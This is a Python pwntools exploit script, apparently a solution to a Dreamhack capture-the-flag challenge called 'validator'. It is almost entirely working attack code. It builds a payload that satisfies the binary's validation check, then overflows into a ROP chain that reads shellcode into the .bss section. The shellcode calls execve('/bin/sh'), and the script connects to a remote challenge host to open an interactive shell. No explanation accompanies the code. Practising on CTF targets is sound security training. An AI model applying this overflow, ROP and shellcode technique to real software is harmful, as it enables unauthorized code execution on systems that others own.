#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./validator_dist', checksec=False)

libc = elf.libc

gs = """
b *main
b *validate+184
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 16740)
    else:
        return process(elf.path)

shellcode = asm(
    '''
    lea rdi, [rip + binsh]
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
    binsh:
        .asciz "/bin/sh"
    ''', arch = 'amd64', os = 'linux'
)

ret = pack(0x00000000004006f4)
poprdi_ret = pack(0x00000000004006f3)
poprsi_popr15_ret = pack(0x00000000004006f1)
poprdx_ret = pack(0x000000000040057b)
poprbp_ret = pack(0x00000000004004f8)

#contains shellcode
bss = pack(elf.bss())

arr_number = []
for i in range(128, 2, -1):
    arr_number.append(i)
payload = b'DREAMHACK!' + bytearray(arr_number)
payload += \
poprdi_ret + pack(0) + \
poprsi_popr15_ret + bss * 2 + \
poprdx_ret + pack(0x64) + pack(elf.plt['read']) + \
bss

io = start()
sl(payload)
pause()
sl(shellcode)


io.interactive()